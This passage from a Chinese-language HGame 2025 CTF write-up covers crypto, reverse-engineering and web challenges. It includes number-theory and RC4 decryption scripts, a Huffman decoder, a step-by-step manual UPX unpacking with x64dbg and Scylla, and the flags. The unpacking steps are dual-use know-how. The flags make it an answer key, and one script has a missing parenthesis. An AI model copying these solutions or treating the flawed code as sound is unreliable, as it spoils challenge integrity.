class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> MAXN = <span class="number">2000010</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> T, n, pri[MAXN], cur, mu[MAXN], sum_mu[MAXN];</span><br><span class="line"><span class="type">bool</span> vis[MAXN];</span><br><span class="line">map&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">long</span> <span class="type">long</span>&gt; mp_mu;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">S_mu</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x)</span> </span>&#123;  <span class="comment">// 求mu的前缀和</span></span><br><span class="line">  <span class="keyword">if</span> (x &lt; MAXN) <span class="keyword">return</span> sum_mu[x];</span><br><span class="line">  <span class="keyword">if</span> (mp_mu[x]) <span class="keyword">return</span> mp_mu[x];  <span class="comment">// 如果map中已有该大小的mu值，则可直接返回</span></span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> ret = (<span class="type">long</span> <span class="type">long</span>)<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">long</span> <span class="type">long</span> i = <span class="number">2</span>, j; i &lt;= x; i = j + <span class="number">1</span>) &#123;</span><br><span class="line">    j = x / (x / i);</span><br><span class="line">    ret -= <span class="built_in">S_mu</span>(x / i) * (j - i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> mp_mu[x] = ret;  <span class="comment">// 路径压缩，方便下次计算</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">S_phi</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x)</span> </span>&#123;  <span class="comment">// 求phi的前缀和</span></span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> ret = (<span class="type">long</span> <span class="type">long</span>)<span class="number">0</span>;</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> j;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">long</span> <span class="type">long</span> i = <span class="number">1</span>; i &lt;= x; i = j + <span class="number">1</span>) &#123;</span><br><span class="line">    j = x / (x / i);</span><br><span class="line">    ret += (<span class="built_in">S_mu</span>(j) - <span class="built_in">S_mu</span>(i - <span class="number">1</span>)) * (x / i) * (x / i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (ret - <span class="number">1</span>) / <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>)-&gt;<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">  cin &gt;&gt; T;</span><br><span class="line">  mu[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; MAXN; i++) &#123;  <span class="comment">// 线性筛预处理mu数组</span></span><br><span class="line">    <span class="keyword">if</span> (!vis[i]) &#123;</span><br><span class="line">      pri[++cur] = i;</span><br><span class="line">      mu[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= cur &amp;&amp; i * pri[j] &lt; MAXN; j++) &#123;</span><br><span class="line">      vis[i * pri[j]] = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">if</span> (i % pri[j])</span><br><span class="line">        mu[i * pri[j]] = -mu[i];</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        mu[i * pri[j]] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; MAXN; i++)</span><br><span class="line">    sum_mu[i] = sum_mu[i - <span class="number">1</span>] + mu[i];  <span class="comment">// 求mu数组前缀和</span></span><br><span class="line">  <span class="keyword">while</span> (T--) &#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">S_phi</span>(n) &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; <span class="built_in">S_mu</span>(n) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//155763335410704472</span></span><br></pre></td></tr></table></figure><p>然后用埃拉托斯特尼筛计算质数个数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count_primes</span>(<span class="params">limit</span>):</span><br><span class="line">    is_prime = np.ones(limit + <span class="number">1</span>, dtype=<span class="built_in">bool</span>)</span><br><span class="line">    is_prime[<span class="number">0</span>:<span class="number">2</span>] = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> current <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(np.sqrt(limit)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> is_prime[current]:</span><br><span class="line">            is_prime[current*current:limit+<span class="number">1</span>:current] = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> np.<span class="built_in">sum</span>(is_prime)</span><br><span class="line">upper_limit = (<span class="number">65537</span>**<span class="number">2</span>) // <span class="number">6</span></span><br><span class="line">prime_count = count_primes(upper_limit)</span><br><span class="line">result=<span class="number">155763335410704472</span>+<span class="built_in">int</span>(prime_count)</span><br><span class="line">enc=<span class="number">2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546</span></span><br><span class="line">p=nextprime(result&lt;&lt;<span class="number">128</span>)</span><br><span class="line">phi=p*(p-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(<span class="number">65537</span>,phi)</span><br><span class="line">m=long_to_bytes(<span class="built_in">pow</span>(enc,d,p*p))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#hgame&#123;sieve_is_n0t_that_HArd&#125;</span></span><br></pre></td></tr></table></figure><h2 id="reverse">Reverse</h2><h3 id="compress-dot-new">Compress dot new</h3><p>根据题意用ai一把梭</p><p>题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def &quot;into b&quot; [] &#123;let arg = $in;0..(( $arg|length ) - 1)|each &#123;|i|$arg|bytes at $i..$i|into int&#125;&#125;;def gss [] &#123;match $in &#123;&#123;s:$s,w:$w&#125; =&gt; [$s],&#123;a:$a,b:$b,ss:$ss,w:$w&#125; =&gt; $ss&#125;&#125;;def gw [] &#123;match $in &#123;&#123;s:$s,w:$w&#125; =&gt; $w,&#123;a:$a,b:$b,ss:$ss,w:$w&#125; =&gt; $w&#125;&#125;;def oi [v] &#123;match $in &#123;[] =&gt; [$v],[$h,..$t] =&gt; &#123;if $v.w &lt; $h.w &#123;[$v,$h] ++ $t&#125; else &#123;[$h] ++ ($t|oi $v)&#125;&#125;&#125;&#125;;def h [] &#123;match $in &#123;[] =&gt; [],[$n] =&gt; $n,[$f,$sn,..$r] =&gt; &#123;$r|oi &#123;a:$f,b:$sn,ss:(($f|gss) ++ ($sn|gss)),w:(($f|gw) + ($sn|gw))&#125;|h&#125;&#125;&#125;;def gc [] &#123;def t [nd, pth, cd] &#123;match $nd &#123;&#123;s:$s,w:$_&#125; =&gt; ($cd|append &#123;s:$s,c:$pth&#125;),&#123;a:$a,b:$b,ss:$_,w:$_&#125; =&gt; &#123;t $b ($pth|append 1) (t $a ($pth|append 0) $cd)&#125;&#125;&#125;;t $in [] []|each &#123;|e|&#123;s:$e.s,cs:($e.c|each &#123;|c|$c|into string&#125;|str join)&#125;&#125;&#125;;def sk [] &#123;match $in &#123;null =&gt; null,&#123;s:$s,w:$_&#125; =&gt; &#123;s:$s&#125;,&#123;a:$a,b:$b,ss:$_,w:$_&#125; =&gt; &#123;a:($a|sk),b:($b|sk)&#125;&#125;&#125;;def bf [] &#123;$in|into b|reduce -f (0..255|reduce -f [] &#123;|i,a|$a|append 0&#125;) &#123;|b,a|$a|update $b (($a|get $b) + 1)&#125;|enumerate|filter &#123;|e|$e.item &gt; 0&#125;|each &#123;|e|&#123;s:$e.index,w:$e.item&#125;&#125;&#125;;def enc [cd] &#123;$in|into b|each &#123;|b|$cd|filter &#123;|e|$e.s == $b&#125;|first|get &quot;cs&quot;&#125;|str join&#125;;def compress []: binary -&gt; string &#123;let t = $in|bf|h;[($t|sk|to json --raw), ($in|enc ($t|gc))]|str join &quot;\n&quot;&#125;</span><br><span class="line"></span><br><span class="line"># source compress.nu; open ./flag.txt --raw | into binary | compress | save enc.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>enc.txt</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:125&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:119&#125;,&quot;b&quot;:&#123;&quot;s&quot;:123&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:104&#125;,&quot;b&quot;:&#123;&quot;s&quot;:105&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:101&#125;,&quot;b&quot;:&#123;&quot;s&quot;:103&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:10&#125;,&quot;b&quot;:&#123;&quot;s&quot;:13&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:32&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:115&#125;,&quot;b&quot;:&#123;&quot;s&quot;:116&#125;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:46&#125;,&quot;b&quot;:&#123;&quot;s&quot;:48&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:76&#125;,&quot;b&quot;:&#123;&quot;s&quot;:78&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:83&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:68&#125;,&quot;b&quot;:&#123;&quot;s&quot;:69&#125;&#125;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:44&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:33&#125;,&quot;b&quot;:&#123;&quot;s&quot;:38&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:45&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:100&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:98&#125;,&quot;b&quot;:&#123;&quot;s&quot;:99&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:49&#125;,&quot;b&quot;:&#123;&quot;s&quot;:51&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:97&#125;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:117&#125;,&quot;b&quot;:&#123;&quot;s&quot;:118&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:112&#125;,&quot;b&quot;:&#123;&quot;s&quot;:113&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:114&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:108&#125;,&quot;b&quot;:&#123;&quot;s&quot;:109&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:110&#125;,&quot;b&quot;:&#123;&quot;s&quot;:111&#125;&#125;&#125;&#125;&#125;&#125;</span><br><span class="linespan><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_huffman</span>(<span class="params">encoded_str, huffman_tree</span>):</span><br><span class="line">    current_node = huffman_tree</span><br><span class="line">    decoded_bytes = <span class="built_in">bytearray</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> encoded_str:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            current_node = current_node[<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># bit is &#x27;1&#x27;</span></span><br><span class="line">            current_node = current_node[<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> current_node:  <span class="comment"># Reached a leaf node</span></span><br><span class="line">            decoded_bytes.append(current_node[<span class="string">&#x27;s&#x27;</span>])</span><br><span class="line">            current_node = huffman_tree  <span class="comment"># Reset to root for next character</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(decoded_bytes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_encoded_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line">        huffman_tree_json = lines[<span class="number">0</span>].strip()  <span class="comment"># Read the first line as Huffman tree</span></span><br><span class="line">        encoded_str = <span class="string">&#x27;&#x27;</span>.join(lines[<span class="number">1</span>:]).strip()  <span class="comment"># The rest is the encoded string</span></span><br><span class="line"></span><br><span class="line">    huffman_tree = json.loads(huffman_tree_json)</span><br><span class="line">    <span class="keyword">return</span> huffman_tree, encoded_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    input_file = <span class="string">&#x27;enc.txt&#x27;</span>  <span class="comment"># Path to your encoded file</span></span><br><span class="line">    output_file = <span class="string">&#x27;decoded_output.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">    huffman_tree, encoded_str = read_encoded_file(input_file)</span><br><span class="line">    decoded_data = decode_huffman(encoded_str, huffman_tree)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(decoded_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure><img src="/images/HGame2025-Writeup/image-20250204113221474.png"alt="image-20250204113221474" /><figcaption aria-hidden="true">image-20250204113221474</figcaption></figure><h3 id="turtle">Turtle</h3><p>第一次做手动upx脱壳，这里就写详细一点，参考<ahref="https://blog.csdn.net/Pisces50002/article/details/135169522">这篇文章</a></p><p>用x64dbg打开，查看断点</p><figure><img src="/images/HGame2025-Writeup/image-20250210141759847.png"alt="image-20250210141759847" /><figcaption aria-hidden="true">image-20250210141759847</figcaption></figure><p>按两次F9到push的断点</p><figure><img src="/images/HGame2025-Writeup/image-20250210141935716.png"alt="image-20250210141935716" /><figcaption aria-hidden="true">image-20250210141935716</figcaption></figure><p>F7单步调试走完push</p><figure><imgsrc="/images/HGame2025-Writeup/image-20250210142041244-1739693668640.png"alt="image-20250210142041244" /><figcaption aria-hidden="true">image-20250210142041244</figcaption></figure><p>在RSP上点击在内存窗口中转到</p><figure><img src="/images/HGame2025-Writeup/image-20250210142143973.png"alt="image-20250210142143973" /><figcaption aria-hidden="true">image-20250210142143973</figcaption></figure><p>右下角设置硬件断点</p><figure><img src="/images/HGame2025-Writeup/image-20250210142306180.png"alt="image-20250210142306180" /><figcaption aria-hidden="true">image-20250210142306180</figcaption></figure><p>F9运行到断点处</p><figure><img src="/images/HGame2025-Writeup/image-20250210142424168.png"alt="image-20250210142424168" /><figcaption aria-hidden="true">image-20250210142424168</figcaption></figure><p>看到jmp，设置断点，F9</p><figure><img src="/images/HGame2025-Writeup/image-20250210142550588.png"alt="image-20250210142550588" /><figcaption aria-hidden="true">image-20250210142550588</figcaption></figure><p>F7步入</p><figure><img src="/images/HGame2025-Writeup/image-20250210142615765.png"alt="image-20250210142615765" /><figcaption aria-hidden="true">image-20250210142615765</figcaption></figure><p>这里就是程序本体，开始dump</p><p>点击scylla插件</p><figure><img src="/images/HGame2025-Writeup/image-20250210142706039.png"alt="image-20250210142706039" /><figcaption aria-hidden="true">image-20250210142706039</figcaption></figure><p>IAT Autosearch然后Get Imports</p><figure><img src="/images/HGame2025-Writeup/image-20250210142801288.png"alt="image-20250210142801288" /><figcaption aria-hidden="true">image-20250210142801288</figcaption></figure><p>删除打叉的节点</p><figure><img src="/images/HGame2025-Writeup/image-20250210142836225.png"alt="image-20250210142836225" /><figcaption aria-hidden="true">image-20250210142836225</figcaption></figure><p>先Dump然后对之前Dump下来的东西Fix Dump</p><figure><img src="/images/HGame2025-Writeup/image-20250210143532908.png"alt="image-20250210143532908" /><figcaption aria-hidden="true">image-20250210143532908</figcaption></figure><p>至此脱壳完成</p><p>接下来用IDA看一下</p><figure><img src="/images/HGame2025-Writeup/image-20250210143741495.png"alt="image-20250210143741495" /><figcaption aria-hidden="true">image-20250210143741495</figcaption></figure><p>跟进函数以后再分析可以得知这个程序的流程大概是先用普通RC4对密钥加密验证输入的密钥，然后用魔改过的RC4和正确的密钥对密文加密验证输入的密文</p><p>exp：</p><p>解密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init</span>(<span class="params">key</span>):</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_encrypt</span>(<span class="params">S, plaintext</span>):</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> plaintext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]  <span class="comment"># swap</span></span><br><span class="line">        K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        output.append(byte ^ K)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(output)</span><br><span class="line"></span><br><span class="line">ciphertext = [-<span class="number">51</span>,-<span class="number">113</span>,<span class="number">37</span>,<span class="number">61</span>,-<span class="number">31</span>]</span><br><span class="line">ciphertext_bytes = <span class="built_in">bytes</span>([x <span class="keyword">if</span> x &gt;= <span class="number">0</span> <span class="keyword">else</span> x + <span class="number">256</span> <span class="keyword">for</span> x <span class="keyword">in</span> ciphertext])+<span class="string">b&#x27;QJ&#x27;</span></span><br><span class="line">key = <span class="string">&quot;yekyek&quot;</span></span><br><span class="line">S_box = rc4_init(key)</span><br><span class="line">plaintext = rc4_encrypt(S_box, ciphertext_bytes</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的文本:&quot;</span>, plaintext)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的文本（字符串形式）:&quot;</span>, plaintext.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;无法以UTF-8格式解码结果，可能需要其他编码格式或是二进制数据&quot;</span>)</span><br><span class="line"><span class="comment">#ecg4ab6</span></span><br></pre></td></tr></table></figure><p>解密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init</span>(<span class="params">key</span>):</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_encrypt</span>(<span class="params">S, plaintext</span>):</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> plaintext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i] </span><br><span class="line">        K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        output.append(byte +K)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        output[i]=output[i]%<span class="number">256</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(output)</span><br><span class="line"></span><br><span class="line">ciphertext = [-<span class="number">8</span>, -<span class="number">43</span>, <span class="number">98</span>, -<span class="number">49</span>, <span class="number">67</span>, -<span class="number">70</span>, -<span class="number">62</span>, <span class="number">35</span>, <span class="number">21</span>, <span class="number">74</span>, <span class="number">81</span>, <span class="number">16</span>, <span class="number">39</span>, <span class="number">16</span>, -<span class="number">79</span>, -<span class="number">49</span>, -<span class="number">60</span>, <span class="number">9</span>, -<span class="number">2</span>, -<span class="number">29</span>, -<span class="number">97</span>, <span class="number">73</span>, -<span class="number">121</span>, -<span class="number">22</span>, <span class="number">89</span>, -<span class="number">62</span>, <span class="number">7</span>, <span class="number">59</span>, -<span class="number">87</span>, <span class="number">17</span>, -<span class="number">63</span>, -<span class="number">68</span>, -<span class="number">3</span>, <span class="number">75</span>, <span class="number">87</span>, -<span class="number">60</span>, <span class="number">126</span>, -<span class="number">48</span>, -<span class="number">86</span>, <span class="number">10</span>]</span><br><span class="line">ciphertext_bytes = <span class="built_in">bytes</span>([x <span class="keyword">if</span> x &gt;= <span class="number">0</span> <span class="keyword">else</span> x + <span class="number">256</span> <span class="keyword">for</span> x <span class="keyword">in</span> ciphertext])</span><br><span class="line">key = <span class="string">&quot;ecg4ab6&quot;</span></span><br><span class="line">S_box = rc4_init(key)</span><br><span class="line">plaintext = rc4_encrypt(S_box, ciphertext_bytes)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的文本:&quot;</span>, plaintext)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的文本（字符串形式）:&quot;</span>, plaintext.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;无法以UTF-8格式解码结果，可能需要其他编码格式或是二进制数据&quot;</span>)</span><br><span class="line"><span class="comment">#hgame&#123;Y0u&#x27;r3_re4l1y_g3t_0Ut_of_th3_upX!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web">Web</h2><h3 id="level-24-pacman">Level 24 Pacman</h3><p>在index.js里面可以看到疑似flag的东西</p><figure><img src="/images/HGame2025-Writeup/image-20250204113436711.png"alt="image-20250204113436711" /><figcaption aria-hidden="true">image-20250204113436711</figcaption></figure><figure><img src="/images/HGame2025-Writeup/image-20250204113512299.png"alt="image-20250204113512299" /><figcaption aria-hidden="true">image-20250204113512299</figcaption></figure><h3 id="level-47-bandbomb">Level 47 